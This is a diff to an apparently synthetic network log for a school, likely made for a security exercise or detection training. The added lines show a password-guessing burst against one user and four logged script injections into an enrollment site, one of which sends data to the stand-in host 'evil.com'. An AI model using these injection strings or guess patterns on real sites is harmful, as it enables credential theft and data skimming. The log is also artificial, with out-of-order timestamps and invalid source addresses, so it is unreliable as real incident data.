@@ -11,13 +11,13 @@
 11 - [2024-02-15T08:00:50Z] SRC:73.41.184.120 DST:10.10.15.6 PROTO:ICMP/0 type:ECHO_REQUEST code:0
 12 - [2024-02-15T08:00:55Z] SRC:219.23.230.243 DST:10.10.15.47 PROTO:TCP/21 note:standard traffic
 13 - [2024-02-15T08:00:24Z] SRC:220.209.235.30 DST:10.10.15.66 PROTO:ICMP/0 type:ECHO_REQUEST code:0
-14 - [2024-02-15T08:00:13Z] SRC:162.232.234.174 DST:10.10.15.26 PROTO:TCP/443 host:gc_computer_3 user:lee auth_attempt:lincoln result:FAIL
-15 - [2024-02-15T08:01:10Z] SRC:146.80.19.136 DST:10.10.15.59 PROTO:UDP/53 query:library.org type:A response:OK
-16 - [2024-02-15T08:00:15Z] SRC:226.170.126.7 DST:10.10.15.80 PROTO:TCP/22 host:gc_computer_1 user:jordan auth_attempt:lincoln result:FAIL
-17 - [2024-02-15T08:00:48Z] SRC:135.83.6.109 DST:10.10.15.14 PROTO:TCP/8080 target:mail.provider.net/login method:GET status:301 inj_detected:None
-18 - [2024-02-15T08:01:25Z] SRC:27.115.184.77 DST:10.10.15.40 PROTO:UDP/123 note:standard traffic
-19 - [2024-02-15T08:00:18Z] SRC:234.172.151.117 DST:10.10.15.17 PROTO:UDP/161 note:standard traffic
-20 - [2024-02-15T08:00:19Z] SRC:37.208.113.40 DST:10.10.15.12 PROTO:UDP/53 query:intranet.local type:A response:OK
+14 - [2024-02-15T13:14:22Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:password123 result:FAIL
+15 - [2024-02-15T13:14:23Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:welcome result:FAIL
+16 - [2024-02-15T13:14:24Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:student result:FAIL
+17 - [2024-02-15T13:14:25Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:guidance result:FAIL
+18 - [2024-02-15T13:14:26Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:counselor result:FAIL
+19 - [2024-02-15T13:14:27Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:lincoln result:FAIL
+20 - [2024-02-15T13:14:28Z] SRC:178.45.22.89 DST:10.10.15.100 PROTO:TCP/443 host:gc_computer_3 user:rodriguez auth_attempt:tigers2024 result:FAIL
 21 - [2024-02-15T08:01:00Z] SRC:198.193.189.165 DST:10.10.15.58 PROTO:ICMP/0 type:ECHO_REQUEST code:0
 22 - [2024-02-15T08:01:03Z] SRC:91.184.110.59 DST:10.10.15.22 PROTO:TCP/22 host:gc_server_2 user:jordan auth_attempt:letmein2024 result:FAIL
 23 - [2024-02-15T08:00:22Z] SRC:187.222.5.228 DST:10.10.15.77 PROTO:TCP/22 host:gc_server_1 user:patel auth_attempt:password123 result:FAIL
@@ -74,10 +74,10 @@
 74 - [2024-02-15T08:03:39Z] SRC:118.111.244.44 DST:10.10.15.13 PROTO:TCP/22 host:gc_computer_1 user:lee auth_attempt:password123 result:FAIL
 75 - [2024-02-15T08:01:14Z] SRC:183.115.192.153 DST:10.10.15.82 PROTO:ICMP/0 type:ECHO_REQUEST code:0
 76 - [2024-02-15T08:02:30Z] SRC:203.152.175.130 DST:10.10.15.31 PROTO:UDP/53 query:school.edu type:A response:OK
-77 - [2024-02-15T08:05:04Z] SRC:141.240.160.11 DST:10.10.15.43 PROTO:TCP/22 host:gc_computer_1 user:jordan auth_attempt:letmein2024 result:SUCCESS
-78 - [2024-02-15T08:02:34Z] SRC:227.95.151.136 DST:10.10.15.90 PROTO:UDP/161 note:standard traffic
-79 - [2024-02-15T08:06:30Z] SRC:183.122.173.57 DST:10.10.15.85 PROTO:ICMP/0 type:ECHO_REQUEST code:0
-80 - [2024-02-15T08:03:57Z] SRC:92.113.45.141 DST:10.10.15.60 PROTO:ICMP/0 type:ECHO_REQUEST code:0
+77 - [2024-02-15T08:32:14Z] SRC:205.167.53.12 DST:10.10.15.8 PROTO:TCP/8080 target:enrollment.lhhs.edu method:POST status:200 inj_detected:<script>grab_form();</script>
+78 - [2024-02-15T08:32:44Z] SRC:205.167.53.12 DST:10.10.15.8 PROTO:TCP/8080 target:enrollment.lhhs.edu method:POST status:200 inj_detected:<script>send_to('evil.com');</script>
+79 - [2024-02-15T08:33:12Z] SRC:205.167.53.12 DST:10.10.15.8 PROTO:TCP/8080 target:enrollment.lhhs.edu method:POST status:200 inj_detected:<script>malicious_javascript();</script>
+80 - [2024-02-15T08:34:01Z] SRC:205.167.53.12 DST:10.10.15.8 PROTO:TCP/8080 target:enrollment.lhhs.edu method:POST status:200 inj_detected:<script>form_submission();</script>
 81 - [2024-02-15T08:06:40Z] SRC:223.154.209.168 DST:10.10.15.10 PROTO:TCP/22 host:gc_server_2 user:smith auth_attempt:lincoln result:FAIL
 82 - [2024-02-15T08:06:45Z] SRC:206.7.152.57 DST:10.10.15.17 PROTO:ICMP/0 type:ECHO_REQUEST code:0
 83 - [2024-02-15T08:01:22Z] SRC:245.215.43.121 DST:10.10.15.42 PROTO:UDP/53 query:school.edu type:A response:OK
